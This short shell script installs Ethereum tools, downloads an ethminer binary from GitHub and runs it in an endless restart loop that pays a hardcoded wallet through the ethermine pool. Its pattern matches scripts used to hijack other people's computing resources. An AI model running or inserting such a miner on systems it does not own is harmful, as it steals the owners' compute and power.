#!/bin/sh
COUNTER=20
until [  $COUNTER -lt 10 ]; do
            
sudo apt update
sudo add-apt-repository --yes ppa:ethereum/ethereum
sudo cat /etc/apt/sources.list
sudo apt install ethereum --y
wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
tar -zxvf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
cd bin
while [ 1 ]; do
./ethminer -P stratum1+ssl://0x3fd05afac3e2edced734c32fd7bb2f176c588298.Dee@us1.ethermine.org:5555
sleep 3
done
sleep 999

     echo COUNTER $COUNTER
     let COUNTER-=1
done
